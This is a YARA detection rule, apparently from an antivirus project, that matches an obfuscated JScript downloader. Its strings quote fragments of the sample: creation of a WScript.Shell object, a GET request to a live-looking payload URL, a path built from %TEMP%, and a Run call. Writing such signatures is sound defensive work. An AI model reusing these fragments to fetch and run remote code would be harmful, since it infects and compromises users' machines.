rule sig_20160427_9fd1473771f5e2a5fb9758627d54e3d1 {
  meta:
    description = "datamaliciousorder - file 20160427_9fd1473771f5e2a5fb9758627d54e3d1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "70871c1d159b3593f10fc9480a0411c9c151e0bec8dfc615c80c58d9d5ebbea9"

  strings:
    $s1  = "EidktCkzxc[RzkjdZbkgc](\"G\" + \"ET\", \"http://pediatriayvacunas.com/q0wps\", false);" fullword ascii
    $s2  = "function RhahqQgbxh() {return EtlwvGzuwz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"MFzgK4k" ascii
    $s3  = "function RhahqQgbxh() {return EtlwvGzuwz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"MFzgK4k" ascii
    $s4  = "function LxshnGnhbn(DmeecFhhfq, GrfayVsmyu){YavbhHithp = YavbhHithp * 1; return DmeecFhhfq - GrfayVsmyu;};" fullword ascii
    $s5  = "var EtlwvGzuwz = function KspsuNwmks() {return LfcxcGbesd[XsvygRhoya](\"WScript\"+\".Shell\");}(), XrnclAcnnp = 11;" fullword ascii
    $s6  = "var LfcxcGbesd = this[\"WScript\"];" fullword ascii
    $s7  = "function NkiqoSxapg(LqypaYzbya) {var HdllgQdbhj = (1, 2, 3, 4, 5, LqypaYzbya); return HdllgQdbhj;};" fullword ascii
    $s8  = "function LdwsoXikio(){return BiriuQddul + \"\";};" fullword ascii
    $s9  = "if (EidktCkzxc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function RyzgnUqujz() {return ((UhgawStxxf == true) && (UhgawStxxf == UqlftVdzrk)) ? 1 : YavbhHithp;};" fullword ascii
    $s11 = "var UhgawStxxf = false;" fullword ascii
    $s12 = "function QbzawJhdfv(){return 23;};" fullword ascii
    $s13 = "var VunncTraxv = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "function QlncgJvlck(GkjjzHfjij){EtlwvGzuwz[\"R\"+\"un\"](GkjjzHfjij, YavbhHithp, YavbhHithp);};" fullword ascii
    $s15 = "UqlftVdzrk = true; " fullword ascii
    $s16 = "var UqlftVdzrk = false;" fullword ascii
    $s17 = "}while (ShteiAqvwd);" fullword ascii
    $s18 = "var YzpxwAtkvc = false;" fullword ascii
    $s19 = "UhgawStxxf = true; " fullword ascii
    $s20 = "function LccmaTpkfe()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}